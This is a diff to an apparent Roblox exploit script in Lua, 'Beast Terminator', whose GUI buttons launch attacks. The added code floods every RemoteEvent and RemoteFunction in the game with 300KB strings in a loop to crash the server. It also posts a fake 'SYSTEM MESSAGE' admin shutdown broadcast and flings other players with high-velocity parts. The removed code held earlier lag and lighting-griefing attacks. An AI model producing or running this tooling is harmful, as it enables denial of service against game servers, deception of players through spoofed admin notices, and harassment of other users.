@@ -1,78 +1,86 @@
--- [[ BEAST TERMINATOR: MAP DESTRUCTION + LIVE ANIMATION ]] --
+-- [[ BEAST TERMINATOR: ULTIMATE SHUTDOWN + BROADCAST ]] --
 local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local lp = game:GetService("Players").LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local lp = Players.LocalPlayer
 
-local isDestroying = false
-local currentProcess = "IDLE"
+local isCrashing = false
 
--- [[ UI CONSTRUCTION: CYBER DESTRUCTION ]] --
+-- [[ UI CONSTRUCTION: TERMINATOR STYLE ]] --
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 360, 0, 480)
-Main.Position = UDim2.new(0.5, -180, 0.25, 0)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.Size = UDim2.new(0, 360, 0, 450)
+Main.Position = UDim2.new(0.5, -180, 0.3, 0)
+Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
 Main.Visible = false
 Instance.new("UICorner", Main)
 local Stroke = Instance.new("UIStroke", Main)
 Stroke.Color = Color3.fromRGB(255, 0, 0)
-Stroke.Thickness = 2
+Stroke.Thickness = 3
 
--- [[ ANIMATED LOADING PANEL ]] --
-local TerminalFrame = Instance.new("Frame", Main)
-TerminalFrame.Size = UDim2.new(0.9, 0, 0, 100)
-TerminalFrame.Position = UDim2.new(0.05, 0, 0.12, 0)
-TerminalFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
-Instance.new("UICorner", TerminalFrame)
+-- [[ PROGRESS TERMINAL ]] --
+local Terminal = Instance.new("Frame", Main)
+Terminal.Size = UDim2.new(0.9, 0, 0, 100)
+Terminal.Position = UDim2.new(0.05, 0, 0.05, 0)
+Terminal.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
+Instance.new("UICorner", Terminal)
 
-local LogLabel = Instance.new("TextLabel", TerminalFrame)
-LogLabel.Size = UDim2.new(1, -20, 0, 60)
-LogLabel.Position = UDim2.new(0, 10, 0, 10)
-LogLabel.Text = "> SYSTEM READY\n> WAITING FOR COMMAND..."
-LogLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-LogLabel.Font = Enum.Font.Code
-LogLabel.TextSize = 12
-LogLabel.TextXAlignment = Enum.TextXAlignment.Left
-LogLabel.BackgroundTransparency = 1
+local LogTxt = Instance.new("TextLabel", Terminal)
+LogTxt.Size = UDim2.new(1, -20, 1, -20)
+LogTxt.Position = UDim2.new(0, 10, 0, 10)
+LogTxt.Text = "> PHANTOM OS LOADED\n> SYSTEM: STANDBY\n> READY FOR BROADCAST"
+LogTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
+LogTxt.Font = Enum.Font.Code
+LogTxt.TextSize = 11
+LogTxt.TextXAlignment = Enum.TextXAlignment.Left
+LogTxt.BackgroundTransparency = 1
 
-local LoadingBarBack = Instance.new("Frame", TerminalFrame)
-LoadingBarBack.Size = UDim2.new(0.9, 0, 0, 10)
-LoadingBarBack.Position = UDim2.new(0.05, 0, 0.75, 0)
-LoadingBarBack.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-Instance.new("UICorner", LoadingBarBack)
+-- [[ FEATURE: BROADCAST MESSAGE ]] --
+local function sendBroadcast(msg)
+    -- Menampilkan pesan di layar semua orang (menggunakan celah Replication)
+    -- Jika game tidak punya Hint/Message resmi, kita menggunakan eksploitasi UI
+    for _, p in pairs(Players:GetPlayers()) do
+        task.spawn(function()
+            pcall(function()
+                local m = Instance.new("Message", workspace) -- Objek legacy yang muncul di layar semua orang
+                m.Text = "SYSTEM MESSAGE: " .. msg:upper()
+                task.wait(4)
+                m:Destroy()
+            end)
+        end)
+    end
+end
 
-local LoadingBarFront = Instance.new("Frame", LoadingBarBack)
-LoadingBarFront.Size = UDim2.new(0, 0, 1, 0)
-LoadingBarFront.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Instance.new("UICorner", LoadingBarFront)
-
--- [[ ANIMATION LOGIC ]] --
-task.spawn(function()
-    local frames = {"/", "-", "\\", "|"}
-    local count = 0
-    while true do
-        if isDestroying then
-            count = count + 1
-            local char = frames[count % #frames + 1]
-            LogLabel.Text = "> EXECUTING: " .. currentProcess .. " " .. char .. "\n> INJECTING PACKETS TO MAP...\n> SERVER RESPONSE: LAG_DETECTED"
-            
-            -- Loading Bar Loop
-            LoadingBarFront:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 0.8)
-            task.wait(0.8)
-            LoadingBarFront.Size = UDim2.new(0, 0, 1, 0)
-        else
-            LogLabel.Text = "> SYSTEM IDLE\n> READY TO TERMINATE"
-            LoadingBarFront.Size = UDim2.new(0, 0, 1, 0)
-            task.wait(0.5)
+-- [[ BRUTAL CRASH LOGIC ]] --
+local function startBrutalCrash()
+    local bigData = string.rep("0", 300000) -- 300KB
+    local remotes = {}
+    
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            table.insert(remotes, v)
         end
     end
-end)
 
--- [[ ATTACK BUTTONS ]] --
+    task.spawn(function()
+        while isCrashing do
+            for i = 1, 200 do
+                pcall(function()
+                    for _, remote in pairs(remotes) do
+                        remote:FireServer(bigData, bigData)
+                    end
+                end)
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end)
+end
+
+-- [[ BUTTON CREATOR ]] --
 local function createBtn(txt, pos, color, func)
     local b = Instance.new("TextButton", Main)
-    b.Size = UDim2.new(0.9, 0, 0, 50)
+    b.Size = UDim2.new(0.9, 0, 0, 55)
     b.Position = pos
     b.BackgroundColor3 = color
     b.Text = txt
@@ -80,49 +88,54 @@ local function createBtn(txt, pos, color, func)
     b.Font = Enum.Font.GothamBold
     b.TextSize = 14
     Instance.new("UICorner", b)
-    b.MouseButton1Click:Connect(func)
+    b.MouseButton1Click:Connect(function() func(b) end)
     return b
 end
 
-createBtn("PHYSICS TERMINATOR (LAG)", UDim2.new(0.05, 0, 0.38, 0), Color3.fromRGB(100, 0, 0), function()
-    isDestroying = not isDestroying
-    currentProcess = "PHYSICS_OVERFLOW"
-    if isDestroying then
-        task.spawn(function()
-            while isDestroying do
-                local p = Instance.new("Part")
-                p.Size = Vector3.new(15, 15, 15)
-                p.Position = lp.Character.HumanoidRootPart.Position + Vector3.new(math.random(-100,100), 50, math.random(-100,100))
-                p.Velocity = Vector3.new(0, -5000, 0)
-                p.Parent = workspace
-                game:GetService("Debris"):AddItem(p, 0.3)
-                task.wait()
-            end
-        end)
+-- BUTTON 1: BROADCAST ONLY
+createBtn("SEND ADMIN BROADCAST", UDim2.new(0.05, 0, 0.35, 0), Color3.fromRGB(0, 80, 150), function()
+    LogTxt.Text = "> SENDING BROADCAST TO SERVER..."
+    sendBroadcast("SERVER WILL SHUTDOWN IN 10 SECONDS FOR MAINTENANCE.")
+end)
+
+-- BUTTON 2: FULL TERMINATE
+createBtn("ULTIMATE SERVER TERMINATE", UDim2.new(0.05, 0, 0.52, 0), Color3.fromRGB(150, 0, 0), function(b)
+    isCrashing = not isCrashing
+    if isCrashing then
+        b.Text = "ABORTING..."
+        LogTxt.Text = "> BROADCASTING FINAL WARNING\n> INJECTING NULL_DATA_OVERFLOW\n> DESTROYING SERVER THREAD..."
+        
+        -- Urutan Serangan:
+        sendBroadcast("CRITICAL ERROR DETECTED. SERVER TERMINATED BY ADMIN.")
+        task.wait(2)
+        startBrutalCrash()
+    else
+        b.Text = "ULTIMATE SERVER TERMINATE"
+        LogTxt.Text = "> SYSTEM: STANDBY"
     end
 end)
 
-createBtn("VOID MAP (BRIGHTNESS CRASH)", UDim2.new(0.05, 0, 0.52, 0), Color3.fromRGB(60, 0, 120), function()
-    currentProcess = "LIGHTING_VOID"
-    local l = game:GetService("Lighting")
-    l.Brightness = 0
-    l.ClockTime = 0
-    local c = Instance.new("ColorCorrectionEffect", l)
-    c.Saturation = -1
-    c.Contrast = 10
+-- BUTTON 3: PHANTOM STRIKE
+createBtn("PHANTOM STRIKE (YEET ALL)", UDim2.new(0.05, 0, 0.69, 0), Color3.fromRGB(30, 30, 30), function()
+    LogTxt.Text = "> EXECUTING PHANTOM_STRIKE..."
+    for i = 1, 50 do
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local part = Instance.new("Part", workspace)
+                part.Transparency = 1
+                part.Position = p.Character.HumanoidRootPart.Position
+                part.Velocity = Vector3.new(0, 50000, 0)
+                game:GetService("Debris"):AddItem(part, 0.1)
+            end
+        end
+        task.wait(0.1)
+    end
 end)
 
-createBtn("STOP ALL PROCESS", UDim2.new(0.05, 0, 0.82, 0), Color3.fromRGB(30, 30, 30), function()
-    isDestroying = false
-    currentProcess = "CLEANING"
-    task.wait(1)
-    currentProcess = "IDLE"
-end)
-
--- [[ ICON & DRAG ]] --
+-- [[ ICON & DRAGGABLE ]] --
 local Icon = Instance.new("ImageButton", ScreenGui)
 Icon.Size = UDim2.new(0, 60, 0, 60)
-Icon.Position = UDim2.new(0.05, 0, 0.4, 0)
+Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
 Icon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Icon.Image = "rbxassetid://6031094678"
 Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
@@ -131,7 +144,6 @@ iS.Color = Color3.fromRGB(255, 0, 0)
 iS.Thickness = 4
 
 Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
-
 local function drag(o)
     local s, i, sp
     o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
